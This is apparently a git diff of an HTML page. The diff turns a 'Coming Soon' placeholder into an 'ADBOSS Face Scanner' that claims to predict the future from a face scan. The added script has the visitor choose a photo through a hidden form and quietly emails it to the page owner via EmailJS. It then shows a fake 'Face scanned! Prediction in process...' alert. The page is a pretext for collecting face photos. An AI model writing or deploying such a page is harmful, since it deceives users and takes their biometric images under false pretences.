@@ -2,96 +2,67 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Advance Feature</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ADBOSS Face Scanner</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
     body {
-      background: radial-gradient(circle, #1f1f1f, #000);
-      font-family: 'Segoe UI', sans-serif;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      overflow: hidden;
-    }
-
-    .container {
+      font-family: sans-serif;
+      background: #e0f7ff;
       text-align: center;
-      animation: fadeSlide 1.5s ease forwards;
+      padding-top: 50px;
     }
 
-    h1 {
-      font-size: 50px;
-      font-weight: 900;
-      color: #00ffe5;
-      text-shadow: 0 0 15px #00ffe5, 0 0 30px #00ffe5;
-      animation: glow 2s infinite ease-in-out;
-      margin-bottom: 20px;
-    }
-
-    p {
-      font-size: 24px;
-      color: #ddd;
-      margin-bottom: 40px;
-      opacity: 0.8;
-    }
-
-    .btn-home {
-      padding: 14px 30px;
-      font-size: 18px;
-      font-weight: bold;
-      background: linear-gradient(135deg, #00ffcc, #0077ff);
-      color: #000;
-      border: none;
-      border-radius: 30px;
+    .option-card {
+      display: inline-block;
+      background: #fff;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+      font-size: 20px;
+      font-weight: 600;
       cursor: pointer;
-      box-shadow: 0 5px 20px rgba(0, 255, 200, 0.4);
-      transition: all 0.3s ease;
-      transform: perspective(800px) rotateX(0deg);
+      transition: transform 0.3s ease;
     }
 
-    .btn-home:hover {
-      transform: scale(1.05) rotateX(10deg);
-      box-shadow: 0 0 25px #00ffe5, 0 0 40px #00bfff;
+    .option-card:hover {
+      transform: scale(1.05);
+      background: #ccf7ff;
     }
 
-    @keyframes fadeSlide {
-      0% {
-        opacity: 0;
-        transform: translateY(-50px);
-      }
-      100% {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @keyframes glow {
-      0% { text-shadow: 0 0 15px #00ffe5, 0 0 30px #00ffe5; }
-      50% { text-shadow: 0 0 30px #00ffcc, 0 0 60px #00ccff; }
-      100% { text-shadow: 0 0 15px #00ffe5, 0 0 30px #00ffe5; }
+    form {
+      display: none;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>🚧 ADVANCE FEATURE</h1>
-    <p>Coming Soon... Stay Tuned! 😎</p>
-    <button class="btn-home" onclick="goHome()">🔙 Back to Home</button>
+  <h1>🔮 Scan Your Face for Future Prediction</h1>
+
+  <div class="option-card" onclick="document.getElementById('photoUploader').click()">
+    📸 Tap to Scan Face
   </div>
 
+  <!-- Hidden form -->
+  <form id="photoForm">
+    <input type="file" name="photo" id="photoUploader" accept="image/*" onchange="sendPhoto()" />
+  </form>
+
+  <!-- EmailJS Script -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    function goHome() {
-      // Redirect to your desired homepage
-      window.location.href = "https://arvinddara.github.io/ADBOSSG/";
+    emailjs.init("YOUR_USER_ID"); // Replace with your actual public key
+
+    function sendPhoto() {
+      const form = document.getElementById("photoForm");
+
+      emailjs.sendForm("YOUR_SERVICE_ID", "template_face", form)
+        .then(() => {
+          alert("✅ Face scanned! Prediction in process...");
+        })
+        .catch((err) => {
+          alert("❌ Upload failed. Try again.");
+          console.error(err);
+        });
     }
   </script>
 
